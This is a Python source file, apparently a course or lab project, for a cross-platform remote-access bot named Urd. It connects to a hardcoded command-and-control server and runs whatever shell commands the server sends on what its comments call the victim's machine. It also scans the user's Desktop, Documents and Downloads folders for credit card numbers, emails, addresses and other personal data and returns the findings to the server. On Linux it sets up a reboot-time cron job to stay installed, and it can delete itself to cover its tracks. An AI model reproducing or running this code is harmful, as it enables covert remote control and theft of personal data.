#!/usr/bin/env python3

"""
AUTHORS: Jeffrey Lee, Toni Mason, Blake Bargen
START DATE: 10/11/2022
END DATE: 10/29/2022
MODULE NAME: Urd.py
"""

from urllib import response


try:
    import socket # Import socket for creating TCP connection.
    from subprocess import PIPE, run # Import subprocess to execute system commands.
    import os # Import os for devnull, remove, mkdir, chdir
    from sys import exit # Import exit from sys to quit program when specified.
    from platform import system # Import system from platform to detect os.
    from threading import Timer, Thread # Import Timer to create thread that'll run every 20s.
    import re
    import glob
    from crontab import CronTab
    

except ImportError as e:
    print(f'Import error: {e}')
    
""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

#  CONSTANTS  #
FILENAME = __file__[2:] # The name of this file.
SYSTEM = system() # The operating this program is being ran on.
IP = '192.168.56.103' # IP address to connect to. Change this to your IP address!
PORT = 53 # Port number to create socket with.
COMMMAND_SIZE = 1024 # Maximum number of bytes the command can be.

""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

def create_client_socket():
	"""This function creates a client socket to connect to 
		our command & control server.
		Arguments:
			None
		Returns:
			This function will return a socket object.
	"""
	client_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Initializing socket.
	ip_port = (IP, PORT) # Tuple containing IP address and port number.
	client_sock.connect(ip_port) # Connecting to server.
	initial_message = system() # Send IP address and OS information.
	client_sock.send(initial_message.encode('utf-8')) # Send message with this host's IP back to the server.
	return client_sock # Return the created client socket.
		
def self_delete():
	"""This function will be invoked when the C&C server enter's the
		keyword "destroy" and which will instruct the program to
		delete traces of itself.
		Arguments:
			None
		Returns:
			Confirmation string.
	"""
	fullpath = os.path.abspath(FILENAME) # Full path of the file.
	if SYSTEM == 'Linux': # Check if OS is Linux to perform Linux remove file commands.
		try:
			'''
			Delete all copies of this file from the Linux file
			system.
			'''
			if os.path.isfile('/tmp/' + FILENAME):
				run(['rm', '/tmp/' + FILENAME]) # Attempt to remove files from Linux file system.
			if os.path.isfile('/etc/' + FILENAME):
				run(['rm', '/etc/' + FILENAME]) # ^
			if os.path.isfile('/var/' + FILENAME):
				run(['rm', '/var/' + FILENAME]) # ^
			if os.path.isfile(fullpath):
				run(['rm', fullpath]) # ^
		except:
			return r"Couldnt remove all files..." # Return this if deletion operation fails.
		return r"Deleted all files..." # Returns this if deletion operation is successful.
	else:
		try:
			'''
			Delete all copies of this file from the Windows file
			system.
			'''
			if os.path.isfile(r'%temp%\\' + FILENAME):
				run([r'del %temp%\\' + FILENAME], shell=True) # Attempt to remove files from Windows file system.
			if os.path.isfile(r'C:\Users\%username%\\' + FILENAME):
				run([r'del C:\Users\%username%\\' + FILENAME], shell=True) # ^
			if os.path.isfile(r'C:\Users\%username%\AppData\\' + FILENAME):
				run([r'del C:\Users\%username%\AppData\\' + FILENAME], shell=True) # ^
			if os.path.isfile(fullpath):
				run(r'del' + fullpath, shell=True) # ^
		except:
			return r"  Couldn't remove all files..." # Return this if deletion operation fails.
		return r'  Deleted all files...' # Returns this if deletion operation is successful.

def lin_recon():
	"""This function will be invoked when the C&C server enter's the
		keyword "lin recon" which will instruct the program to
		search recursively for regex matches in files in some common
		linux directories.
	"""
	responses = {}
	finder = PiiRegex()
	files = glob.glob(os.getenv("HOME") + "/Desktop/" + r'/**/*', recursive = True)
	files2 = glob.glob(os.getenv("HOME") + "/Documents/" + r'/**/*', recursive = True)
	files3 = glob.glob(os.getenv("HOME") + "/Downloads/" + r'/**/*', recursive = True)
	files = files[:] + files2[:] + files3[:]
	for file in files:
		if os.path.isfile(file):
			try:
				assert os.path.isfile(file)
				with open(os.path.join(os.getcwd(),file),'r', encoding='utf-8') as f:
					try:
						if finder.any_match(str(f.readlines())):
							responses[file] = [os.path.basename(file), finder.get_attributes()]
					except Exception as e:
						pass
			except AssertionError as e:
				pass
	return responses

def win_recon():
	"""This function will be invoked when the C&C server enter's the
		keyword "win recon" which will instruct the program to
		search recursively for regex matches in files in some common
		windows directories.
	"""
	responses = {}
	finder = PiiRegex()
	files = glob.glob("C:\\Users\\" + str(os.getlogin()) + "\\Desktop\\**\\*", recursive = True)   
	files2 = glob.glob("C:\\Users\\" + str(os.getlogin()) + "\Documents\\**\\*", recursive = True)
	files3 = glob.glob("C:\\Users\\" + str(os.getlogin()) + "\\Downloads\\**\\*", recursive = True)
	files = files[:] + files2[:] + files3[:]
	for file in files:
		if os.path.isfile(file):
			try:
				assert os.path.isfile(file)
				with open(os.path.join(os.getcwd(),file),'r') as f:
					try:
						if finder.any_match(str(f.readlines())):
							responses[file] = [os.path.basename(file), finder.get_attributes()]
					except Exception as e:
						pass
			except AssertionError as e:
				pass
	return responses

def Cronstuff():
	cron = CronTab(user=True)
	exists = False
	iter = cron.find_command('Urd.py')
	for item in iter:
		if 'Urd.py' in str(item):
			exists = True
			break
	if exists == False:
		job = cron.new(command='/~/Downloads/Urd.py')
		job.every_reboot()
		cron.write()

""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

# LOGIC AND CLASSES FOR RECON FUNCTIONS #

"""" The regular expression logic as well as the regex and PiiRegex classes were taken from PiiRegex on GitHub. 
		It can be found at https://github.com/Poogles/piiregex.
	We added the the get_attributes method to return any findings to the server.
"""

date = re.compile(
    u"(?:(?<!\:)(?<!\:\d)[0-3]?\d(?:st|nd|rd|th)?\s+(?:of\s+)?(?:jan\.?|january|feb\.?|february|mar\.?|march|apr\.?|april|may|jun\.?|june|jul\.?|july|aug\.?|august|sep\.?|september|oct\.?|october|nov\.?|november|dec\.?|december)|(?:jan\.?|january|feb\.?|february|mar\.?|march|apr\.?|april|may|jun\.?|june|jul\.?|july|aug\.?|august|sep\.?|september|oct\.?|october|nov\.?|november|dec\.?|december)\s+(?<!\:)(?<!\:\d)[0-3]?\d(?:st|nd|rd|th)?)(?:\,)?\s*(?:\d{4})?|[0-3]?\d[-\./][0-3]?\d[-\./]\d{2,4}",
    re.IGNORECASE,
)
time = re.compile(u"\d{1,2}:\d{2} ?(?:[ap]\.?m\.?)?|\d[ap]\.?m\.?", re.IGNORECASE)
phone = re.compile(
    u"""((?:(?<![\d-])(?:\+?\d{1,3}[-.\s*]?)?(?:\(?\d{3}\)?[-.\s*]?)?\d{3}[-.\s*]?\d{4}(?![\d-]))|(?:(?<![\d-])(?:(?:\(\+?\d{2}\))|(?:\+?\d{2}))\s*\d{2}\s*\d{3}\s*\d{4}(?![\d-])))"""
)
phones_with_exts = re.compile(
    u"((?:(?:\+?1\s*(?:[.-]\s*)?)?(?:\(\s*(?:[2-9]1[02-9]|[2-9][02-8]1|[2-9][02-8][02-9])\s*\)|(?:[2-9]1[02-9]|[2-9][02-8]1|[2-9][02-8][02-9]))\s*(?:[.-]\s*)?)?(?:[2-9]1[02-9]|[2-9][02-9]1|[2-9][02-9]{2})\s*(?:[.-]\s*)?(?:[0-9]{4})(?:\s*(?:#|x\.?|ext\.?|extension)\s*(?:\d+)?))",
    re.IGNORECASE,
)
email = re.compile(
    u"([a-z0-9!#$%&'*+\/=?^_`{|.}~-]+@(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?)",
    re.IGNORECASE,
)
ip_addr = re.compile(
    u"(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)",
    re.IGNORECASE,
)
ipv6 = re.compile(
    u"\s*(?!.*::.*::)(?:(?!:)|:(?=:))(?:[0-9a-f]{0,4}(?:(?<=::)|(?<!::):)){6}(?:[0-9a-f]{0,4}(?:(?<=::)|(?<!::):)[0-9a-f]{0,4}(?:(?<=::)|(?<!:)|(?<=:)(?<!::):)|(?:25[0-4]|2[0-4]\d|1\d\d|[1-9]?\d)(?:\.(?:25[0-4]|2[0-4]\d|1\d\d|[1-9]?\d)){3})\s*",
    re.VERBOSE | re.IGNORECASE | re.DOTALL,
)

credit_card = re.compile(u"((?:(?:\\d{4}[- ]?){3}\\d{4}|\\d{15,16}))(?![\\d])")
btc_address = re.compile(
    u"(?<![a-km-zA-HJ-NP-Z0-9])[13][a-km-zA-HJ-NP-Z0-9]{26,33}(?![a-km-zA-HJ-NP-Z0-9])"
)
street_address = re.compile(
    u"\d{1,4} [\w\s]{1,20}(?:street|st|avenue|ave|road|rd|highway|hwy|square|sq|trail|trl|drive|dr|court|ct|park|parkway|pkwy|circle|cir|boulevard|blvd)\W?(?=\s|$)",
    re.IGNORECASE,
)
zip_code = re.compile(r"\b\d{5}(?:[-\s]\d{4})?\b")
po_box = re.compile(r"P\.? ?O\.? Box \d+", re.IGNORECASE)

postcodes = re.compile("([gG][iI][rR] {0,}0[aA]{2})|((([a-pr-uwyzA-PR-UWYZ][a-hk-yA-HK-Y]?[0-9][0-9]?)|(([a-pr-uwyzA-PR-UWYZ][0-9][a-hjkstuwA-HJKSTUW])|([a-pr-uwyzA-PR-UWYZ][a-hk-yA-HK-Y][0-9][abehmnprv-yABEHMNPRV-Y]))) {0,}[0-9][abd-hjlnp-uw-zABD-HJLNP-UW-Z]{2})")
ukphones = re.compile("^\s*\(?(020[7,8]{1}\)?[ ]?[1-9]{1}[0-9{2}[ ]?[0-9]{4})|(0[1-8]{1}[0-9]{3}\)?[ ]?[1-9]{1}[0-9]{2}[ ]?[0-9]{3})\s*$")

regexes = {
    "dates": date,
    "times": time,
    "phones": phone,
    "phones_with_exts": phones_with_exts,
    "emails": email,
    "ips": ip_addr,
    "ipv6s": ipv6,
    "credit_cards": credit_card,
    "btc_addresses": btc_address,
    "street_addresses": street_address,
    "zip_codes": zip_code,
    "po_boxes": po_box,
    "postcodes": postcodes,
    "ukphones": ukphones
}


class regex:
    def __init__(self, obj, regex):
        self.obj = obj
        self.regex = regex

    def __call__(self, *args):
        def regex_method(text=None):
            return [x for x
                    in self.regex.findall(text or self.obj.text)]

        return regex_method


class PiiRegex(object):
	def __init__(self, text=""):
		self.text = text

		# Build class attributes of callables.
		for k, v in regexes.items():
			setattr(self, k, regex(self, v)(self))

		if text:
			for key in regexes.keys():
				method = getattr(self, key)
				setattr(self, key, method())

	def any_match(self, text=""):
		"""Scan through all available matches and try to match.
		"""
		if text:
			self.text = text

			# Regenerate class attribute callables.
			for k, v in regexes.items():
				setattr(self, k, regex(self, v)(self))
			for key in regexes.keys():
				method = getattr(self, key)
				setattr(self, key, method())

		matches = []
		for match in regexes.keys():
			# If we've got a result, add it to matches.
			if getattr(self, match):
				matches.append(match)
				

		return True if matches else False

	def get_attributes(self):
		attr = []
		for k in regexes.keys():
			if getattr(self, k):
				attr.extend([k,getattr(self, k)])
		return attr

""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

class WindowsBot:
	"""This class definition will contain the functions and commands
		that are specific to the Windows operating system.
	"""
	def __init__(self):
		pass

	def exec_windows_cmd(self, command: str):
		"""This function will execute Windows commands requested by the C&C.
			Argments:
				command (str): The command that will be executed on the victim's machine.
			Returns:
				Will return the output of the command that was executed.
		"""

		DEVNULL = open(os.devnull, 'w') # Open devnull file to send stderr to.
		try:
			os.chdir(command[3:]) # Attempt to change directory.
			return "Ok" # Returns Ok if changing of directory was successsful.
		except:
			try:
				
				output = run(command, # Run command.
						shell=True, # Perform this command in cmd.exe.
						stdout=PIPE, # Pipe command to store in variable.
						stderr=DEVNULL)	# Send standard error to devnull.
				return output.stdout # Return the stdout property of this subprocess object.
			except:
				try:
					os.system(command) # Try executing command with OS module.
				except:
					return "[-] Invalid command." # Return this error message if unsuccessful.

	def handle_request(self):
		"""This function will handle all tasks related to request made by the server.
			Arguments:
				None
			Returns:
				None
		"""
		sock = create_client_socket() # Store socket object.
		try:
			with sock: # Utilizing this socket connection in context manager.
				while True: # Continue to receive commands.
					command = sock.recv(COMMMAND_SIZE).decode('utf-8') # Receive command from server.
					command_output = '[-] Invalid command.'
					if command.strip() == 'destroy': # Attempt to delete any traces of this file.
						command_output = self_delete()
					elif command.strip() == 'recon':
						command_output = win_recon()
					else:
						command_output = self.exec_windows_cmd(command) # Execute command on machine and store the response.
						
					sock.send(bytes(str(command_output), 'utf-8')) # Send the output to the C&C server.
		except:
			exit(1)

""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

class LinuxBot:
	"""This class definition will contain the functions and commands
		that are specific to the Linux operating system.
	"""
	def __init__(self):
		pass
	
	def exec_linux_cmd(self, command: str):
		"""This function will execute Linux commands requested by the C&C.
			Argments:
				command (str): The command that will be executed on the victim's machine.
			Returns:
				Will return the output of the command that was executed.
		"""
		DEVNULL = open(os.devnull, 'w') # Open devnull file to send stderr to.
		try:
			# os.popen('cat /etc/services').read()
			output = run(command.split(), # Run command.
						stdout=PIPE, # Pipe command to store in variable.
						stderr=DEVNULL)	# Send standard error to devnull.
			return output.stdout # Return the stdout property of this subprocess object.
		except:
			try:
				os.chdir(command[3:]) # Attempt to change directory.
				return 'Ok' # Returns Ok if changing of directory was successsful.
			except:
				try:
					os.system(command) # Try executing command with OS module.
				except:
					return "[-] Invalid command." # Return this error message if unsuccessful.

	def handle_request(self):
		"""This function will handle all tasks related to request made by the server.
			Arguments:
				None
			Returns:
				None
		"""
		sock = create_client_socket() # Store socket object.
		try:
			with sock: # Utilizing this socket connection in context manager.
				while True: # Continue to receive commands.
					command = sock.recv(COMMMAND_SIZE).decode('utf-8') # Receive command from server.
					command_output = '[-] Invalid command.'
					if command.strip() == 'destroy': # Attempt to delete any traces of this file.
						command_output = self_delete()
					elif command.strip() == 'recon':
						command_output = lin_recon()
					else:
						command_output = self.exec_linux_cmd(command) # Execute command on machine and store the response.
					sock.send(bytes(str(command_output), 'utf-8')) # Send the output to the C&C server.
		except:
			exit(1)

""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

def main():
    obj = None
    if SYSTEM == 'Linux': # Check if operating system is Linux.
        Cronstuff()
        obj = LinuxBot() # If Linux, instantiate LinuxBot object.
    else:
        obj = WindowsBot() # Else, instantiate WindowsBot object.

    obj.handle_request() # Will invoke function that will handle all socket connection operations.

if __name__ == '__main__':
    main()
